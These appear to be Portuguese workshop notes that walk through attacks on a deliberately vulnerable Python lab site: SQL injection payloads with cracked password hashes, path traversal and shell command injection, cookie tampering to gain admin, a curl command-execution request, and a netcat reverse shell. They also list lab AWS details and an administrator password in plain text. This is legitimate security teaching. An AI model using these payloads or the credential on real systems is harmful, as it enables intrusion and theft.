# Infraestrutura

### Windows

Region: us-east-1

Instance id: This is the Windows client with tools for the Python_SafeSite Security Workshop

AMI name: SecLabClient

Description: This is the Windows client with tools for the Python_SafeSite Security Workshop

Administrator Password: mBp4t;Jvg6!dskzt3DCHa@w7H?l5.?VE

AMI id: ami-01127273b979fe92b

### Linux

Region: us-east-1

Instance id: i-0458f66b29d690451

AMI name: SecLabServer

Description: This is the Linux server with the vulnerable site for the Python_SafeSite Security Workshop

AMI id: ami-01127273b979fe92b

# Falhas e Ataques

#### Página Inicial: SQL Injection

Ao colocar uma aspa dupla (") no campo de busca, o site quebra. Isso mostra que o site é vulnerável a ataques SQL Injection. Um agravante é que o desenvolvedor deixou a página de Debug habilitada, mostrando detalhes do erro e inclusive a engine (SQLite3). Com a informação do SQL é possível compor um ataque que seja adicionado à cláusula where da query:

- Original: 
  
  - SELECT * FROM posts WHERE Content LIKE "%"%";

- Alteradas:
  
  - SELECT * FROM posts WHERE Content LIKE "%X" union select 1, 2 --%"; 
    
    - X" union select 1, 2 --
    - X" union select name, sql from sqlite_master where type='table' --
    - X" union select name || ': ' || card, password from secrets --
    - X" union select login || ': ' || email, password from logins --

Obtivemos os hashes dos logins, que podem ser facilmente quebrados no [https://crackstation.net/](https://crackstation.net/):

084e0343a0486ff05530df6c705c8bb4: guest@guest
084e0343a0486ff05530df6c705c8bb4

21232f297a57a5a743894a0e4a801fc3: admin@admin
0192023a7bbd73250516f069df18b500

263bce650e68ab4e23f28263760b9fa5: maria@gmail.com
3a1f9e20f1beac9b81a1e18e08b7f442

dc599a9972fde3045dab59dbd1ae170b: carlos@hotmail.com
a07bda8fd5e39462b4c3d860a36f6b4d

| Hash                             | Tipo | Senha       |
| -------------------------------- | ---- | ----------- |
| 084e0343a0486ff05530df6c705c8bb4 | md5  | guest       |
| 0192023a7bbd73250516f069df18b500 | md5  | admin123    |
| 3a1f9e20f1beac9b81a1e18e08b7f442 | md5  | unicornio   |
| a07bda8fd5e39462b4c3d860a36f6b4d | md5  | corinthians |

#### Sobre Nós: Path Traversal, Remote Command Execution

A página Sobre Nós claramente exibe o conteúdo de arquivos texto que estão no servidor. Ao clicar em um deles, a URL fica da seguinte forma:

[http://localhost:8000/about?doc=termo_de_uso](http://localhost:8000/about?doc=termo_de_uso)

Vamos explorar esse parâmetro:

- ?doc=x: Tela em branco
- ?doc=/etc/passwd: Tela em branco

Provavelmente não vemos nada porque esse campo recebe o nome do arquivo e faz prepend de um caminho e append de uma extensão. Logo, termo_de_uso deve virar algo como /pasta/termo_de_uso.txt. Se isso for verdade, podemos testar com diretórios relativos + null bytes e também com múltiplos nomes de arquivos.

- [http://localhost:8000/about?doc=../../../../../etc/passwd%00](http://localhost:8000/about?doc=../../../../../etc/passwd%00)  Quebra por causa do null byte.
- [http://localhost:8000/about?doc=/etc/hostname /etc/fstab /etc/passwd /etc/mtab /etc/hosts](http://localhost:8000/about?doc=/etc/hostname%20/etc/fstab%20/etc/passwd%20/etc/mtab%20/etc/hosts) mostra o conteúdo de todos os arquivos, menos o primeiro e o último.
- Será que neste contexto ele repassa o path para o shell? Se sim, podemos tentar executar comandos... [http://localhost:8000/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x](http://localhost:8000/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x). Game over!

#### Contato: CSRF + XSS (Firefox)

Estes ataques XSS não funcionam no Chrome.

No primeiro formulário é possível executar um XSS, mas ele não é persistido.

No segundo, entretanto, ele é persistido, mas não é executado.

Para fazer o ataque, a vítima tem que clicar em um link feito para roubar a sessão ou capturar o browser, com um software como o Beef, por exemplo.

#### Cadastro: XSS, File Upload

Ao criar um usuário, é possível fazer o upload de um arquivo qualquer que não seja uma foto para o servidor. No caso de um site PHP, por exemplo, este arquivo pode ser uma shell que permita acesso remoto ao servidor.

#### Área Restrita: HTTP Brute Force

Com o THC-Hydra, Burp Suite ou OWASP ZAP é possível facilmente quebrar as senhas, já que não há um limitador de tempo.

#### Perfil: HTTP Brute Force

O mesmo que o item anterior.

#### Global: Cookie Tampering (or Poisoning)

Ao criar um usuário de testes chamado cleber com senha 12345, os seguintes cookies foram setados após o login:

- pyverysafeid: 5c675a11f4a8474c3d75ff158570850a (este é cleber em MD5)

- pyverysafelogin: ee11cbb19052e40b07aac0ca060c23ee (este é a palavra user)

Se o hash é a palavra user, o que acontece se eu mudar para admin em MD5?

21232f297a57a5a743894a0e4a801fc3 -> admin

Ao trocar o cookie e dar refresh, os privilégios da sessão são elevados instantaneamente!

#### Global: Directory Search

Como não há nenhum recurso que impeça múltiplos requests sequenciais, ferramentas como o DIRB, o Nikto e o ZAP podem fazer ataques fuzzy ou via listas para encontrar diretórios ocultos.

#### Status: Form Tampering (or Poisoning)

O diretório /status que só permite a execução de determinados comandos e apenas para o usuário admin, pode ser burlado via troca de parâmetros no request para que comandos sejam enviados diretamente ao servidor.

Exemplo: 

curl --cookie 'pyverysafelogin=21232f297a57a5a743894a0e4a801fc3' 'http://localhost:8000/status' -X POST --data 'cmd=ls -l /'

Um shell remoto pode ser lançado aqui:

- Atacante: nc -lvp 3000
- Vítima: nc 192.168.15.25 3000 -e /bin/bash
